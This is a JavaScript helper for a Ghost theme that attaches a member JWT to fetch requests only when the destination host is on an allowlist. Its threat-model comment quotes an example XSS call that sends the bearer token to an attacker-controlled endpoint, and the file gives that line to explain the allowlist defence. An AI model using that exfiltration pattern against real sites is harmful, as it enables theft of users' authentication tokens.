/*
 * MOAuth — closure-private Ghost member JWT helper.
 *
 * The Ghost members identity token (RS512, sub=email) is fetched from
 * /members/api/session/ on demand and cached in module-scope variables
 * inside this IIFE. The token NEVER appears on `window` — only the
 * single public method `MOAuth.fetch(url, init)` is exposed, which
 * attaches the bearer header internally before delegating to
 * window.fetch.
 *
 * Threat model
 * ============
 * The original design (D1) made the bearer closure-private so an XSS
 * couldn't extract it via `window.MOAdminAuth.getToken()`. But the
 * Codex audit (2026-05-11) pointed out that the helper itself is a
 * usable exfiltration mechanism: an XSS can call
 *   window.MOAuth.fetch("https://attacker.workers.dev/collect")
 * and the bearer goes straight to an attacker-controlled CORS
 * endpoint. Closure-private only protected against EXTRACTION, not
 * against ABUSE-IN-PLACE.
 *
 * This version adds a destination allowlist. authedFetch attaches the
 * bearer only when the target host is:
 *   - same-origin (location.host), OR
 *   - one of the worker hosts the theme is configured to call (read
 *     from <body data-*-worker-url>, <meta name="mo-api-base">, and
 *     per-element data-worker-url / data-kit-bridge-url attributes).
 *
 * Any other destination is REJECTED with a TypeError before the fetch
 * even goes out. No silent auth-stripping fallback — that masks bugs
 * and gives an attacker an easy reconnaissance signal. The rejection
 * is also console.error'd so it surfaces in mo-errors.
 *
 * Trade-off: an XSS can still call MOAuth.fetch against a TRUSTED
 * worker (e.g. POST a bookmark in the user's name). That's the
 * irreducible residue — short of removing the helper, there's no way
 * to distinguish legitimate JS from XSS-injected JS once they share
 * the page. But the JWT can no longer be exfiltrated to use against
 * other systems or persist for later abuse.
 *
 * Public API (window.MOAuth):
 *   fetch(url, init?)
 *     Returns Promise<Response>. Identical to fetch() but with
 *     `Authorization: Bearer <jwt>` attached if a member is signed
 *     in AND the destination is allowlisted. Untrusted destinations
 *     return a rejected promise.
 *
 * Notes:
 * - When no member is signed in (or token fetch fails) the request
 *   goes out without an Authorization header. Worker is responsible
 *   for returning 401 if it requires auth.
 * - Token expiry: refreshed ~30s before exp claim. On 401 the token
 *   is invalidated immediately so the next call re-fetches a fresh one.
 *
 * Adding a new worker to the allowlist:
 *   - If it's stamped on body (data-foo-worker-url), it's harvested
 *     automatically.
 *   - If it's stamped on a per-element data-worker-url or similar,
 *     the harvest runs lazily on first MOAuth.fetch call so by then
 *     the DOM is parsed and the element exists.
 *   - If it's hardcoded in JS, add the host to BUILTIN_TRUSTED_HOSTS
 *     below.
 *
 * Back-compat:
 * - The previous global `window.MOAdminAuth` (with .headers() and
 *   .getToken()) is REMOVED. Any caller still using it errors loudly.
 */
(function () {
  let cachedToken = null;
  let cachedExp = 0;

  // ---------------------------------------------------------------------
  // Destination allowlist
  // ---------------------------------------------------------------------

  // Hosts always allowed even if not present in the DOM. Add to this
  // set when a worker is called from JS without a corresponding data
  // attribute (audit any addition carefully — anything in this set
  // can receive the member JWT). Currently:
  //
  //   - mo-audio, mo-pdf: hosts are hardcoded in article-audio.js /
  //     article-pdf.js because the @custom settings hit their 20-cap.
  //     The /sign endpoint is JWT-required.
  const BUILTIN_TRUSTED_HOSTS = new Set([
    location.host,
    "mo-audio.mo-podcast-feed.workers.dev",
    "mo-pdf.mo-podcast-feed.workers.dev",
  ]);

  // Filled lazily on first MOAuth.fetch call. We can't fully populate at
  // IIFE-time because admin-auth.js now loads before {{{body}}} (so per-
  // element data-worker-url attributes aren't parsed yet). Re-harvesting
  // on first call is fine because no MOAuth.fetch happens before
  // DOMContentLoaded in practice — all callers are either event handlers
  // or post-load hydration.
  const trustedHosts = new Set(BUILTIN_TRUSTED_HOSTS);
  let harvested = false;

  function addHost(url) {
    if (!url) return;
    try { trustedHosts.add(new URL(url, location.href).host); }
    catch (_) { /* malformed config value — ignore */ }
  }

  function harvestTrustedHosts() {
    const {body} = document;
    if (body) {
      // Body-stamped worker URLs from default.hbs.
      for (const attr of [
        "data-kit-worker-url",
        "data-admin-worker-url",
        "data-search-worker-url",
        "data-error-worker-url",
        "data-podcast-feed-url",
      ]) {
        addHost(body.getAttribute(attr));
      }
    }
    // Membership API base (mo-membership).
    const apiBaseMeta = document.querySelector('meta[name="mo-api-base"]');
    if (apiBaseMeta) addHost(apiBaseMeta.getAttribute("content"));
    // Per-element URLs (gift, kit-bridge, etc.) stamped inside {{{body}}}.
    // querySelectorAll is a one-time pass — cheap.
    document.querySelectorAll("[data-worker-url], [data-kit-bridge-url], [data-api-base]").forEach((el) => {
      addHost(el.getAttribute("data-worker-url"));
      addHost(el.getAttribute("data-kit-bridge-url"));
      addHost(el.getAttribute("data-api-base"));
    });
    harvested = true;
  }

  function isTrusted(url) {
    let parsed;
    try { parsed = new URL(url, location.href); }
    catch (_) { return false; }
    if (trustedHosts.has(parsed.host)) return true;
    // Late-added elements (e.g. an admin page that injects a node with
    // data-worker-url after IIFE-time) — re-harvest once on the first
    // miss after the initial harvest, in case the DOM grew.
    if (harvested) {
      harvestTrustedHosts();
      if (trustedHosts.has(parsed.host)) return true;
    }
    return false;
  }

  async function fetchTokenInternal() {
    try {
      const r = await fetch("/members/api/session/", { credentials: "same-origin" });
      if (!r.ok) return null;
      const text = (await r.text()).trim();
      let token = text;
      if (text.startsWith("{")) {
        try {
          const j = JSON.parse(text);
          token = j.identity || j.token || null;
        } catch (_) { token = null; }
      }
      if (!token) return null;
      try {
        const parts = token.split(".");
        const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
        cachedExp = (payload.exp || 0) * 1000;
      } catch (_) {
        cachedExp = Date.now() + 5 * 60 * 1000;
      }
      cachedToken = token;
      return token;
    } catch (_) {
      return null;
    }
  }

  async function getTokenInternal() {
    if (cachedToken && Date.now() < cachedExp - 30 * 1000) return cachedToken;
    return await fetchTokenInternal();
  }

  function invalidate() {
    cachedToken = null;
    cachedExp = 0;
  }

  async function authedFetch(url, init) {
    // Lazily build the trusted-hosts set the first time we're called.
    // By now {{{body}}} has been parsed (callers are all post-load),
    // so per-element data-worker-url attributes are visible.
    if (!harvested) harvestTrustedHosts();
    if (!isTrusted(url)) {
      const err = new TypeError(`MOAuth.fetch refused: untrusted destination ${url}`);
      console.error("[MOAuth] refusing to attach bearer to untrusted host", url);
      return Promise.reject(err);
    }
    const opts = { ...init || {}};
    const headers = new Headers((init && init.headers) || {});
    const token = await getTokenInternal();
    if (token) headers.set("Authorization", `Bearer ${token}`);
    opts.headers = headers;
    const res = await fetch(url, opts);
    // If the worker rejects the bearer (401), drop the cached token
    // so the next call refetches. Don't auto-retry — the caller may
    // want to surface the 401 to the user.
    if (res.status === 401) invalidate();
    return res;
  }

  // Pre-warm the token on load so the first authenticated fetch
  // (often during pagehide for kit-events) doesn't need to wait
  // for /members/api/session/. Gated on data-member-email so we
  // don't hit the endpoint on every public-page view for non-members
  // (the response is fast but still ~20k visits/week of waste).
  // Fire-and-forget either way.
  try {
    if (document.body && document.body.getAttribute("data-member-email")) {
      getTokenInternal();
    }
  } catch (_) { /* noop */ }

  window.MOAuth = { fetch: authedFetch };
})();
